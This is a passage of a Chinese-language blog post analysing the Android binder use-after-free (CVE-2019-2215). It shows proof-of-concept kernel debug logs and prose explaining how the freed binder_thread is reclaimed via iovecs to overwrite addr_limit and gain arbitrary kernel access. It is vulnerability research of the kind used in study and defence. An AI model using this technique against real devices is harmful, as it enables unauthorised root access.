class="number">0</span> *********</span><br><span class="line">POC: binder_thread_release: current = ffffffc0575e5e80</span><br><span class="line">POC: binder_thread_release: thread = ffffffc0571da200 wait = ffffffc0571da2a0 task_list = ffffffc0571da2a8 prev = ffffffc0571da2b0 next = ffffffc0571da2a8</span><br><span class="line">POC: rw_copy_check_uvector: iov = ffffffc0571da200  iovlen = <span class="number">0x19</span></span><br><span class="line"></span><br><span class="line">********** <span class="number">1</span> *********</span><br><span class="line">POCDEMO BE: copy_to_iter: addr=<span class="number">0xffffffc0571dae00</span> bytes=<span class="number">0x1</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov=<span class="number">0xffffffc0576b3e78</span>  type=<span class="number">0x0</span>  offset=<span class="number">0x0</span> count=<span class="number">0x31</span> iov=ffffffc0571da200 segs=<span class="number">0x19</span> iov-&gt;base=<span class="number">0</span>x          (null)=<span class="number">0x0</span> iov-&gt;len=<span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc0571dae00</span> --&gt; <span class="number">0xffffffc0571da058</span></span><br><span class="line"></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da200</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da208</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da210</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da218</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da220</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da228</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da230</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da238</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da240</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da248</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da250</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da258</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da260</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da268</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da270</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da278</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da280</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da288</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da290</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da298</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2a0</span> --&gt; <span class="number">0x100000000</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2a8</span> --&gt; <span class="number">0x1</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2b0</span> --&gt; <span class="number">0xdeadbeef</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2b8</span> --&gt; <span class="number">0x28</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2c0</span> --&gt; <span class="number">0xbeefdead</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2c8</span> --&gt; <span class="number">0x8</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2d0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2d8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2e0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2e8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2f0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2f8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da300</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da308</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da310</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da318</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da320</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da328</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da330</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da338</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da340</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da348</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da350</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da358</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da360</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da368</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da370</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da378</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da380</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da388</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da390</span> --&gt; <span class="number">0xffffffc0575e5e80</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da398</span> --&gt; <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2b0</span> --&gt; <span class="number">0xdeadbeef</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2b8</span> --&gt; <span class="number">0x28</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2c0</span> --&gt; <span class="number">0xbeefdead</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2c8</span> --&gt; <span class="number">0x8</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2d0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2d8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2e0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2e8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2f0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2f8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da300</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da308</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da310</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da318</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da320</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da328</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da330</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da338</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da340</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da348</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da350</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da358</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da360</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da368</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da370</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da378</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da380</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da388</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da390</span> --&gt; <span class="number">0xffffffc0575e5e80</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da398</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter bytes=<span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">********** <span class="number">2</span> *********</span><br><span class="line">POCDEMO_BEFOR: remove_wait_queue: wait  = ffffffc057177840 task_list = ffffffc057177858 prev = ffffffc057177860 next = ffffffc057177858</span><br><span class="line">POCDEMO_BEFOR: remove_wait_queue: whead = ffffffc0571da2a0 task_list = ffffffc0571da2a8 prev = ffffffc0571da2b0 next = ffffffc0571da2a8</span><br><span class="line">POCDEMO_BEFOR: remove_wait_queue: <span class="number">0x100000000</span> <span class="number">0x1</span> <span class="number">0xdeadbeef</span> <span class="number">0x28</span></span><br><span class="line">POCDEMO_DEMOE: remove_wait_queue: [<span class="number">1</span>] <span class="number">0x100010000</span> <span class="number">0x1</span> <span class="number">0xdeadbeef</span> <span class="number">0x28</span></span><br><span class="line">POCDEMO_DEMOE: remove_wait_queue: [<span class="number">2</span>] <span class="number">0x100010000</span> <span class="number">0xffffffc0571da2a8</span> <span class="number">0xffffffc0571da2a8</span> <span class="number">0x28</span></span><br><span class="line">POCDEMO_AFTER: remove_wait_queue: wait  = ffffffc057177840 task_list = ffffffc057177858 prev = ffffffc057177860 next = ffffffc057177858</span><br><span class="line">POCDEMO_AFTER: remove_wait_queue: whead = ffffffc0571da2a0 task_list = ffffffc0571da2a8 prev = ffffffc0571da2b0 next = ffffffc0571da2a8</span><br><span class="line">POCDEMO_AFTER: remove_wait_queue: <span class="number">0x100010001</span> <span class="number">0xffffffc0571da2a8</span> <span class="number">0xffffffc0571da2a8</span> <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">********** <span class="number">3</span> *********</span><br><span class="line">POCDEMO BE: copy_to_iter: addr=<span class="number">0xffffffc057623c00</span> bytes=<span class="number">0x30</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov=<span class="number">0xffffffc0576b3e78</span>  type=<span class="number">0x0</span>  offset=<span class="number">0x0</span> count=<span class="number">0x30</span> iov=ffffffc0571da2b0 segs=<span class="number">0xe</span> iov-&gt;base=<span class="number">0xffffffc0571da2a8</span>=<span class="number">0xffffffc0571da2a8</span> iov-&gt;len=<span class="number">0x28</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc057623c00</span> --&gt; <span class="number">0x1</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc057623c08</span> --&gt; <span class="number">0xdeadbeef</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc057623c10</span> --&gt; <span class="number">0x28</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc057623c18</span> --&gt; <span class="number">0xffffffc0575e5e88</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc057623c20</span> --&gt; <span class="number">0x8</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc057623c28</span> --&gt; <span class="number">0xfffffffffffffffe</span></span><br><span class="line">POCDEMO BE: copy_to_iter: <span class="number">0xffffffc057623c30</span> --&gt; <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2b0</span> --&gt; <span class="number">0xffffffc0571da2a8</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2b8</span> --&gt; <span class="number">0x28</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2c0</span> --&gt; <span class="number">0xbeefdead</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2c8</span> --&gt; <span class="number">0x8</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2d0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2d8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2e0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2e8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2f0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da2f8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da300</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da308</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da310</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da318</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da320</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da328</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da330</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da338</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da340</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da348</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da350</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da358</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da360</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da368</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da370</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da378</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da380</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da388</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da390</span> --&gt; <span class="number">0xffffffc0575e5e80</span></span><br><span class="line">POCDEMO BE: copy_to_iter: iov value <span class="number">0xffffffc0571da398</span> --&gt; <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2d0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2d8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2e0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2e8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2f0</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da2f8</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da300</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da308</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da310</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da318</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da320</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da328</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da330</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da338</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da340</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da348</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da350</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da358</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da360</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da368</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da370</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da378</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da380</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da388</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da390</span> --&gt; <span class="number">0xffffffc0575e5e80</span></span><br><span class="line">POCDEMO AF: copy_to_iter: iov value <span class="number">0xffffffc0571da398</span> --&gt; <span class="number">0x0</span></span><br><span class="line">POCDEMO AF: copy_to_iter bytes=<span class="number">0x30</span></span><br></pre></td></tr></table></figure>

<p>分析这份日志，可得出写 <code>addr_limit</code> 的过程。简单来说，0 处日志 <code>recvmsg</code> 占位刚释放的 <code>binder_thread</code> 内存；1 处日志将 1 字节数据写入到 <code>0x100000000</code> 即 <code>dummy_page_4g_aligned</code> 内存处，然后 <code>recvmsg</code> 阻塞住等待写端数据到来；2 处触发漏洞，将 <code>iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base</code> 更改为 <code>binder_thread</code> 中的 <code>task_list.next</code> 地址 <code>0xffffffc0571da2a8</code>；3 处表明从 <code>0xffffffc0571da2a8</code> 开始写 <code>0x28</code> 字节，也就是 <code>second_write_chunk</code> 的前 5 个数据，注意 <code>0xffffffc0571da2a8</code> 所在的内存地址是 <code>0xffffffc0571da2b0</code>，写入过程的数据变化：</p>
<p>写之前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iov value <span class="number">0xffffffc0571da2a8</span> --&gt; ?</span><br><span class="line">iov value <span class="number">0xffffffc0571da2b0</span> --&gt; <span class="number">0xffffffc0571da2a8</span></span><br><span class="line">iov value <span class="number">0xffffffc0571da2b8</span> --&gt; <span class="number">0x28</span></span><br><span class="line">iov value <span class="number">0xffffffc0571da2c0</span> --&gt; <span class="number">0xbeefdead</span></span><br><span class="line">iov value <span class="number">0xffffffc0571da2c8</span> --&gt; <span class="number">0x8</span></span><br></pre></td></tr></table></figure>

<p>写之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iov value <span class="number">0xffffffc0571da2a8</span> --&gt; <span class="number">0x1</span></span><br><span class="line">iov value <span class="number">0xffffffc0571da2b0</span> --&gt; <span class="number">0xdeadbeef</span></span><br><span class="line">iov value <span class="number">0xffffffc0571da2b8</span> --&gt; <span class="number">0x28</span></span><br><span class="line">iov value <span class="number">0xffffffc0571da2c0</span> --&gt; addr_limit(current_ptr + <span class="number">0x8</span>)</span><br><span class="line">iov value <span class="number">0xffffffc0571da2c8</span> --&gt; <span class="number">0x8</span></span><br></pre></td></tr></table></figure>

<p>继续往下写，原 iov 地址 <code>0xbeefdead</code>，变成了 <code>addr_limit</code> 地址，也就是向 <code>addr_limit</code> 处写入 0x8 大小的数据 <code>0xfffffffffffffffe</code>，这样就打开了 <code>addr_limit</code> 的限制，接下来可以随意访问内核。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上就是对该 binder 漏洞的简要分析。</p>
<p>2019-12-10 update: 增加 google pj0 和一个国外小哥对该漏洞的解读和 root 尝试参考链接</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://github.com/torvalds/linux/commit/7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target="_blank" rel="noopener">fix commit</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" rel="noopener">chromium bug details</a></li>
<li><a href="http://oenhan.com/epoll-linux-kernel" target="_blank" rel="noopener">EPOLL的LINUX内核工作机制</a></li>
<li><a href="https://www.cnblogs.com/lojunren/p/3856290.html" target="_blank" rel="noopener">Linux下的I/O复用与epoll详解</a></li>
<li><a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html" target="_blank" rel="noopener">Bad Binder: Android In-The-Wild Exploit</a></li>
<li><a href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/" target="_blank" rel="noopener">Tailoring CVE-2019-2215 to Achieve Root</a></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/exp/" rel="tag"># exp</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-next post-nav-item">
                <a href="/2019/09/13/Android DEX-VMP 虚拟保护技术/" rel="next" title="Android DEX-VMP 虚拟保护技术">
                  <i class="fa fa-chevron-left"></i> Android DEX-VMP 虚拟保护技术
                </a>
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-prev post-nav-item">
            </div>
          </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#void-leak-task-struct-void"><span class="nav-number">3.</span> <span class="nav-text">void leak_task_struct(void)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#void-clobber-addr-limit-void"><span class="nav-number">4.</span> <span class="nav-text">void clobber_addr_limit(void)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="site-author-image" itemprop="image" alt="GeneBlue"
    src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">GeneBlue</p>
  <div class="site-description" itemprop="description">Personal Blog</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/GeneBlue" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;GeneBlue" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:geneblue.mail@gmail.com" title="E-Mail &amp;rarr; mailto:geneblue.mail@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
